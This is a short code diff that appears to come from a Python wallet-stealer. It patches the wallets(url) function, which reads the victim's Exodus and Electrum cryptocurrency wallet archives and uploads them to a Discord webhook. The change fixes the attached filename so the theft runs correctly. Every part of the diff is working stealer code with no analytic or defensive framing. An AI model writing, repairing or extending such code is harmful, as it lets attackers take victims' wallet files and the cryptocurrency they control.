@@ -224,7 +224,7 @@ def wallets(url):
     
         try:
             with open("Exodus.zip", "rb") as wallet:
-                wallet_zip = File(wallet, filename=os.path.basename(file))
+                wallet_zip = File(wallet, filename="Exodus.zip")
                 webhook.send(file=wallet_zip)
         except:
             embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
@@ -247,7 +247,7 @@ def wallets(url):
     
         try:
             with open("Electrum.zip", "rb") as wallet:
-                wallet_zip = File(wallet, filename=os.path.basename(file))
+                wallet_zip = File(wallet, filename="Electrum.zip")
                 webhook.send(file=wallet_zip)
         except:
             embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
